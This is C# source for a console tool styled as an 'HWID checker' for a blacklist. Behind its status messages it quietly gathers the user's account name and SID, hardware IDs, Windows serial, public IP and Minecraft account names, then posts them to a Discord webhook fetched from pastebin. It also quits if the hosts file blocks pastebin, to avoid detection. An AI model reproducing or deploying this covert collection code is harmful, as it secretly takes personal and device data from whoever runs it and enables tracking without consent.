using Discord.Webhook;
using Discord.Webhook.HookRequest;
using HWID;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;


namespace Main
{
    class Program
    {
        public static async Task Main()
        {

            {
                Console.Title = "Hwid Checker";
                Console.WriteLine("Checking HWID.....");
                Thread.Sleep(1500);

                //hosts file check 
                string we = "C:\\Windows\\System32\\drivers\\etc\\hosts";
                string asd = System.IO.File.ReadAllText(we);
                if (asd.Contains("pastebin")) {
                    Environment.Exit(0);
                } 

                // Webhook
                string dsweb = new WebClient().DownloadString("INSERT PASTEBIN RAW LINK WITH WEBHOOK");

                // Webhook Requests
                DiscordWebhook discordWebhook = new DiscordWebhook();
                discordWebhook.HookUrl = dsweb;
                DiscordHookBuilder discordHookBuilder = DiscordHookBuilder.Create("HWID LOGS BOT");

                // String Grab
                Hwid Hwid = new Hwid();
                string username = Environment.UserName;
                string IDCPU = (Hwid.GetCPUID());
                string IDMB = (Hwid.GetBaseboardID());
                string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                string hwid = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
                string dir = Assembly.GetExecutingAssembly().Location;
                string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
                ManagementObject os = new ManagementObject("Win32_OperatingSystem=@");
                string serial = (string)os["SerialNumber"];
                

                Console.Clear();
                Console.WriteLine("Checking Minecraft Alts....");
                Thread.Sleep(1500);


                //minecraft alts thanks for https://github.com/MrCreeper2010/SMTool for the alts check
                StringBuilder minecraftalts = new StringBuilder();
                JObject obj = JsonConvert.DeserializeObject<JObject>(File.ReadAllText($@"C:\Users\{Environment.UserName}\AppData\Roaming\.minecraft\launcher_accounts.json"));
                Regex rgx = new Regex("\".*?\"");

                foreach (JToken s in obj["accounts"])
                {
                    Match mhc = rgx.Match(s.ToString());
                    if (mhc.Success)
                        minecraftalts.AppendLine(obj["accounts"][mhc.Value.Replace("\"", "")]["minecraftProfile"]["name"].ToString());
                }

                //blacklist check
                var client = new HttpClient();
                var database = await client.GetAsync("INSERT PASTEBIN RAW WITH IDCPU STRING FOR BLACKLIST").Result.Content.ReadAsStringAsync();

                Console.Clear();
                Console.WriteLine("Checking Any Blacklisted HWID....");
                Thread.Sleep(1500);



                Console.Clear();
                Console.WriteLine("Sending Information....");
                Thread.Sleep(1500);

                // Sending Information To Webhook
                DiscordEmbedField[] fields = new DiscordEmbedField[]
                {
                        new DiscordEmbedField("PC: ", user, false),
                        new DiscordEmbedField("Serialnumber: ", serial, false),
                        new DiscordEmbedField("CPU ID: ", IDCPU, false),
                        new DiscordEmbedField("Motherboard ID: ", IDMB, false),
                        new DiscordEmbedField("Cartella: ", dir, false),
                        new DiscordEmbedField("IP: ", ip, false),
                        new DiscordEmbedField("Minecraft Accounts: ", minecraftalts.ToString(),false),
                        new DiscordEmbedField("Skiddata:", hwid, false)
                };
                DiscordEmbed item = new DiscordEmbed("Avvio rilevato alle " + DateTime.Now, "", 16711680, "", "Hwid Check Completed", "", fields);
                discordHookBuilder.Embeds.Add(item);
                DiscordHook hookRequest = discordHookBuilder.Build();
                discordWebhook.Hook(hookRequest);

                //finish

                {
                    if (database.Contains(IDMB))
                    {
                        Console.Clear();
                        Console.WriteLine("This HWID Is Blacklisted: " + IDMB + " " + "Nice Try!");
                        Console.ReadLine();
                        Environment.Exit(0);
                    }
                    else
                    {
                        Console.Clear();
                        Console.WriteLine("Check Completed!");
                        Console.ReadLine();
                        Environment.Exit(0);
                    }
                }

            }
        }
    }
}